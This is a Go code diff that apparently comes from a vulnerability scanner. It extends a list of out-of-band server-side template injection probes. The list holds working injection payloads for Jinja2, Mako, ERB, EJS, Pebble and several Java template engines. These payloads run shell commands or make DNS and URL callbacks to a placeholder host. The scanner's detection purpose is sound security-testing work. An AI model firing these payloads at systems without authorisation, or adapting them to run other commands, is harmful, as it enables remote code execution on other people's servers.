@@ -15,6 +15,16 @@ type sstiTimePayload struct {
 }
 
 // oastPayloads are OAST-based SSTI payloads that trigger DNS lookups.
+//
+// Two families are covered. The first runs a shell command (nslookup) through the
+// engine — this proves command execution but only works where the engine can spawn
+// a process. The second (the java* engines) performs the callback with a pure-JVM
+// DNS resolution (java.net.InetAddress.getByName) or URL fetch, needing no shell at
+// all: JVM template stacks (Spring EL, Thymeleaf, Velocity, OGNL/Struts, generic
+// Java EL) frequently run in contexts where process execution is sandboxed or
+// disabled while outbound name resolution still succeeds, so a shell-only probe
+// misses them. The %s placeholder is the OAST host; the callback (a DNS lookup, and
+// an HTTP fetch for the URL-based variants) is what confirms evaluation.
 var oastPayloads = []sstiOASTPayload{
 	{engine: "jinja2", template: "{{config.__class__.__init__.__globals__['os'].popen('nslookup %s').read()}}"},
 	{engine: "mako", template: "${__import__('os').popen('nslookup %s').read()}"},
@@ -22,6 +32,14 @@ var oastPayloads = []sstiOASTPayload{
 	{engine: "erb", template: "<%=`nslookup %s`%>"},
 	{engine: "ejs", template: "<%%= require('child_process').execSync('nslookup %s') %%>"},
 	{engine: "pebble", template: "{%% set cmd = 'nslookup %s' %%}{%% set runtime = beans.get('runtime') %%}{{ runtime.exec(cmd) }}"},
+
+	// JVM engines — DNS/URL callback via pure Java, no process spawn required.
+	{engine: "java-el", template: "${T(java.net.InetAddress).getByName('%s')}"},
+	{engine: "spring-el", template: "#{T(java.net.InetAddress).getByName('%s')}"},
+	{engine: "thymeleaf", template: `<p th:text="${T(java.net.InetAddress).getByName('%s')}"></p>`},
+	{engine: "velocity", template: `#set($a="")#set($x=$a.getClass().forName("java.net.InetAddress").getByName("%s"))${x}`},
+	{engine: "ognl-struts", template: "${#context['com.opensymphony.xwork2.dispatcher.ServletContext'].getResource('/').toURI().resolve('http://%s').toURL().hashCode()}"},
+	{engine: "java-generic", template: `#{"".getClass().forName("java.net.URL").getConstructors()[2].newInstance("http://%s").hashCode()}`},
 }
 
 // timePayloads are time-delay based SSTI payloads.
